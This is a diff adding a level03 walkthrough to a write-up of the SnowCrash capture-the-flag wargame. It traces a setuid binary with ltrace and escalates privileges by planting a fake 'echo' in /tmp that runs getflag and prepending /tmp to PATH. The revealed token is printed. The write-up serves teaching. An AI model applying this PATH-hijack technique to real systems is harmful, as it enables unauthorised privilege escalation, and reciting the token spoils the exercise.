@@ -186,7 +186,7 @@ And exactly as the previous level, it worked! And we are now in the **level02**
 
 <summary>Explanations</summary>
 
-##
+###
 
 For the level02, we get a file for the first time:
 ```bash
@@ -306,5 +306,64 @@ level03@SnowCrash:~$
 ```
 
 The flag is valid! So let's go on the next level
+
+</details>
+
+## level03
+
+<details>
+
+<summary>Explanations</summary>
+
+###
+
+For this level, we have a file entitled ``level03``. This file is a binary. When executing it, it does this:
+```bash
+level03@SnowCrash:~$ ./level03
+Exploit me
+```
+
+We don't get nothing much by executing the program. However, we can check what the program actually does with the ``ltrace`` command:
+```bash
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                                                                                         = 2003
+geteuid()                                                                                                                         = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                                               = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                            = 0
++++ exited (status 0) +++
+```
+
+As we can see, the program is actually making a call to ``echo``. This is our door. Since the program is using the ``PATH`` to ``echo``, we can modify the ``PATH`` to run our own ``echo`` command.
+
+To do so, we need to create our fake echo and making it executable:
+```bash
+level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo
+level03@SnowCrash:~$ chmod +x /tmp/echo
+```
+
+Now that it's done, we need to add the path where is located our fake echo in the ``PATH`` before the actual path of ``echo``:
+```bash
+level03@SnowCrash:~$ export PATH=/tmp:$PATH
+```
+
+And now, when we try to execute the ``level03`` program:
+```bash
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
+
+If we try the flag:
+```bash
+level03@SnowCrash:~$ su level04
+Password: 
+level04@SnowCrash:~$ 
+```
+
+The flag is the right one!
 
 </details>
